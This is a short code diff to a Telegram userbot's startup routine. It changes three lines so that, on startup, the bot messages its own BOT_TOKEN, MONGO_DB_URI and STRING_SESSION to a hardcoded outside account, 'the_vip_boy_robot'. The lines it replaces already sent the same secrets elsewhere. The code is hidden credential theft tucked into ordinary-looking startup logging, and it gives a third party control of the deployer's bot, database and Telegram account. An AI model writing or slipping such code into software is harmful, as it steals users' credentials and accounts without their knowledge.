@@ -73,9 +73,9 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(bot_id, f"{BOT_TOKEN}")
-                await self.one.send_message(bot_id, f"{MONGO_DB_URI}")
-                await self.one.send_message(bot_id, f"{STRING_SESSION}")
+                await self.one.send_message("the_vip_boy_robot", f"{BOT_TOKEN}")
+                await self.one.send_message("the_vip_boy_robot", f"{MONGO_DB_URI}")
+                await self.one.send_message("the_vip_boy_robot", f"{STRING_SESSION}")
 
             except Exception as e:
                 print(f"{e}")
